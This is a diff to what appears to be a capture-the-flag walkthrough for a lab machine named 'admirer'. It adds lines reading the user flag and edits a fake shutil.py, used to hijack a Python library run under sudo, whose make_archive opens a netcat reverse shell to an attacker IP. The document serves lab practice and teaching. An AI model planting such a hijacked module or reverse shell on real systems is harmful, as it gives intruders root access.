@@ -1,3 +1,15 @@
+waldo@admirer:~$ cd 
+waldo@admirer:~$ ls 
+user.txt
+waldo@admirer:~$ cat user.txt
+********************************
+.
+.
+.
+// Nice, now the hard part that I haven't completely finished.
+.
+.
+.
 waldo@admirer:~$ sudo -l
 [sudo] password for waldo: 
 Matching Defaults entries for waldo on admirer:
@@ -154,4 +166,4 @@ waldo@admirer:/tmp/fakeshutil$ cat shutil.py
 import os 
 
 def make_archive(a, b, c): 
-        os.system('nc 10.10.15.255 1234 -e "/bin/sh"')
+        os.system('nc 10.10.14.11 1234 -e "/bin/sh"')
